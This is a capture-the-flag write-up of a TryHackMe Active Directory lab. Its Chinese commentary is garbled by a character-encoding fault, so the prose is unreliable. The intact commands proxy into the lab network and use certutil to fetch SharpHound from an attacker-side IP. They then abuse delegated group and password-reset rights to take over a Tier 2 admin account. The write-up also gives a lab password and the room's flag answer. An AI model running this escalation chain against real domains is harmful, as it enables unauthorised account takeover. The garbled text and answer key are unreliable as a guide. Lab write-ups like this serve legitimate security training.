# å‰ç½®ä»£ç†

è¿™ä¸ªæˆ¿é—´æˆ‘åœ¨æœ¬åœ°æ— æ³•ç›´è¿žvpnï¼Œéœ€è¦åŠ å‰ç½®ä»£ç†

## ssh
åªèƒ½è½¬å‘tcp

sshåŠ¨æ€ç»‘å®šæœ¬åœ°è½¬å‘ç«¯å£
```
ssh -N -D 127.0.0.1:9050 root@xxxx
```
åœ¨ovpnæœ€å‰é¢åŠ è¿™ä¸¤è¡Œ
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kalié…ç½®DNS

é…ç½®DNSæ–‡ä»¶
```
vim /etc/resolv.conf 
```

ä¸Šé¢é…ç½®æ–‡ä»¶å¡«å…¥ä»¥ä¸‹å†…å®¹
```
nameserver 10.200.83.101     #THMDCçš„ip
nameserver 114.114.114.114   #çœŸå®žçš„DNSåœ°å€ï¼Œä»¥ä¿è¯kaliè¿˜èƒ½è¿žæŽ¥ç½‘ç»œ
```

é‡å¯ç½‘ç»œ
```
systemctl restart systemd-resolved
```

éªŒè¯
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nslookup thmdc.za.tryhackme.loc
Server:         10.200.83.101
Address:        10.200.83.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.83.101

```

# èŽ·å–ç”¨æˆ·å‡­æ®

ç™»å½•```http://distributor.za.tryhackme.loc/creds```ç”Ÿæˆä¸€ä¸ªç”¨æˆ·ç™»å½•å‡­æ®

```
Your credentials have been generated: Username: max.smith Password: Kdbt1458
```

sshç™»å½•
```
ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
```

# Task 2  Exploiting Permission Delegation


ACE

**ForceChangePassword**ï¼šæˆ‘ä»¬å¯ä»¥åœ¨ä¸çŸ¥é“ç”¨æˆ·å½“å‰å¯†ç çš„æƒ…å†µä¸‹è®¾ç½®ç”¨æˆ·å½“å‰å¯†ç ã€‚
**AddMembers**ï¼šæˆ‘ä»¬æœ‰èƒ½åŠ›å°†ç”¨æˆ·ï¼ˆåŒ…æ‹¬æˆ‘ä»¬è‡ªå·±çš„å¸æˆ·ï¼‰ã€ç»„æˆ–è®¡ç®—æœºæ·»åŠ åˆ°ç›®æ ‡ç»„ã€‚
**GenericAll**ï¼šæˆ‘ä»¬å¯ä»¥å®Œå…¨æŽ§åˆ¶å¯¹è±¡ï¼ŒåŒ…æ‹¬æ›´æ”¹ç”¨æˆ·å¯†ç ã€æ³¨å†Œ SPN æˆ–å°† AD å¯¹è±¡æ·»åŠ åˆ°ç›®æ ‡ç»„çš„èƒ½åŠ›ã€‚
**GenericWrite**ï¼šæˆ‘ä»¬å¯ä»¥æ›´æ–°ç›®æ ‡å¯¹è±¡çš„ä»»ä½•éžä¿æŠ¤å‚æ•°ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ä»¥è®©æˆ‘ä»¬æ›´æ–° scriptPath å‚æ•°ï¼Œè¿™å°†å¯¼è‡´è„šæœ¬åœ¨ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶æ‰§è¡Œã€‚
**WriteOwner**ï¼šæˆ‘ä»¬æœ‰èƒ½åŠ›æ›´æ–°ç›®æ ‡å¯¹è±¡çš„æ‰€æœ‰è€…ã€‚æˆ‘ä»¬å¯ä»¥è®©è‡ªå·±æˆä¸ºæ‰€æœ‰è€…ï¼Œä»Žè€ŒèŽ·å¾—å¯¹è¯¥å¯¹è±¡çš„é¢å¤–æƒé™ã€‚
**WriteDACL**ï¼šæˆ‘ä»¬æœ‰èƒ½åŠ›å°†æ–°çš„ ACE å†™å…¥ç›®æ ‡å¯¹è±¡çš„DACLã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ª ACEï¼ŒæŽˆäºˆæˆ‘ä»¬çš„å¸æˆ·å¯¹ç›®æ ‡å¯¹è±¡çš„å®Œå…¨æŽ§åˆ¶æƒã€‚
**AllExtendedRights**ï¼šæˆ‘ä»¬èƒ½å¤Ÿé’ˆå¯¹ç›®æ ‡å¯¹è±¡æ‰§è¡Œä¸Žæ‰©å±• AD æƒé™ç›¸å…³çš„ä»»ä½•æ“ä½œã€‚ä¾‹å¦‚ï¼Œè¿™åŒ…æ‹¬å¼ºåˆ¶æ›´æ”¹ç”¨æˆ·å¯†ç çš„èƒ½åŠ›ã€‚


thmæä¾›çš„jsonæˆ‘æœ¬åœ°æ— æ³•è¯†åˆ«ï¼Œé‡æ–°æ”¶é›†ä¸€ä»½
```
PS C:\Users\max.smith\Documents> certutil -urlcache -split -f "http://10.50.81.218/SharpHound.exe" SharpHound.exe   
****  Online  ****
  000000  ...
CertUtil: -URLCache command completed successfully.
PS C:\Users\max.smith\Documents> .\SharpHound.exe -c all
-----------------------------------------------
Initializing SharpHound at 9:43 AM on 8/11/2022
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container


[+] Creating Schema map for domain ZA.TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=ZA,DC=TRYHACKME,DC=LOC 
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 17 MB RAM
[+] Creating Schema map for domain TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=TRYHACKME,DC=LOC
Status: 5128 objects finished (+5128 512.8)/s -- Using 58 MB RAM
Enumeration finished in 00:00:10.7635721
Compressing data to .\20220811094325_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 9:43 AM on 8/11/2022! Happy Graphing!

PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/11/2022   9:43 AM         307482 20220811094325_BloodHound.zip
-a----        8/11/2022   9:42 AM         833536 SharpHound.exe
-a----        8/11/2022   9:43 AM        1092647 Y2Y1YjhlMjMtNjA5Ny00YjA5LWFmOTMtZTc5YjA1NTU3YzNm.bin


```


æ‹·è´å›žkali
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# scp za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc:C:/Users/max.smith/Documents/20220811094325_BloodHound.zip .
za.tryhackme.loc\max.smith@thmwrk1.za.tryhackme.loc's password: 
20220811092711_BloodHound.zip   
```

ä»Žæœ¬ç”¨æˆ·åˆ°```TIER 2 ADMINS```çš„ä¸€æ¡æ”»å‡»è·¯å¾„


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660208864433.jpg)


æœ¬ç”¨æˆ·ï¼ˆmaxï¼‰å±žäºŽ```Domain users```ç”¨æˆ·ç»„

```Domain users```ç”¨æˆ·ç»„å¯ä»¥æ·»åŠ ä»»ä½•æˆå‘˜åˆ°```IT SUPPORT```ç”¨æˆ·ç»„

```IT SUPPORT```ç”¨æˆ·ç»„å¯ä»¥å¼ºåˆ¶æ›´æ”¹ç”¨æˆ·```T2_HENRY.HARVEY```çš„å¯†ç 

ç”¨æˆ·```T2_HENRY.HARVEY```å±žäºŽ```TIER 2 ADMINS```ç”¨æˆ·ç»„



é¦–å…ˆï¼Œå°†å½“å‰è´¦å·æ·»åŠ è¿›```IT Support```ç”¨æˆ·ç»„ï¼Œç„¶åŽç”¨Get-ADGroupMemberéªŒè¯æ·»åŠ ç»“æžœ
```
PS C:\> Add-ADGroupMember "IT Support" -Members "max.smith"
PS C:\> Get-ADGroupMember -Identity "IT Support"

...
...
distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : max.smith
objectClass       : user
objectGUID        : f0cd5ecd-6a42-4eff-8015-071e1dc3747b
SamAccountName    : max.smith
SID               : S-1-5-21-3885271727-2693558621-2658995185-1142

```


èŽ·å–"Tier 2 Admins"ç»„æˆå‘˜ï¼Œçœ‹åˆ°æœ‰t2_henry.harveyçš„ä¿¡æ¯
```
PS C:\> Get-ADGroupMember -Identity "Tier 2 Admins"

...
...

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

```


å¼ºåˆ¶ä¿®æ”¹å¯†ç ,æŠ¥é”™æŠ¥Access is denied
```
PS C:\> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force 
PS C:\> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password               
Set-ADAccountPassword : Access is denied 
At line:1 char:1
+ Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (t2_henry.harvey:ADAccount) [Set-ADAccountPassword], UnauthorizedA  
   ccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.M  
   anagement.Commands.SetADAccountPassword

```

æ•™ç¨‹è¯´éœ€è¦ç­‰10åˆ†é’Ÿæ–­å¼€å†è¿žsshæµ‹è¯•,åŽŸå› æ˜¯ï¼š

> æƒé™å°šæœªé€šè¿‡åŸŸä¼ æ’­ã€‚è¿™æœ€å¤šå¯èƒ½éœ€è¦ 10 åˆ†é’Ÿã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯ç»ˆæ­¢æ‚¨çš„ SSH æˆ–RDPä¼šè¯ï¼Œç¨ä½œä¼‘æ¯ï¼Œç„¶åŽé‡æ–°éªŒè¯å¹¶é‡è¯•ã€‚æ‚¨ä¹Ÿå¯ä»¥è¿è¡Œgpupdate /forceç„¶åŽæ–­å¼€è¿žæŽ¥å¹¶é‡æ–°è¿žæŽ¥ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹ä¼šå¯¼è‡´åŒæ­¥å‘ç”Ÿå¾—æ›´å¿«

å‡ åˆ†é’ŸåŽå†æ¬¡ä¿®æ”¹ï¼Œä¿®æ”¹æˆåŠŸ
```
PS C:\Users\max.smith> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force
PS C:\Users\max.smith> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password
PS C:\Users\max.smith>  

```

çŽ°åœ¨å¯ä»¥é€šè¿‡```t2_henry.harvey:max.123456```ç™»å½•ssh
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# ssh za.tryhackme.loc\\t2_henry.harvey@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_henry.harvey@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>whoami
za\t2_henry.harvey

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>hostname
THMWRK1

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>

```

> Which ACE would allow you to update any non-protected parameter of a target object?

> GenericWrite

> What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?

> THM{Permission.Delegation.FTW!}

# Task 3  Exploiting Kerberos Delegation

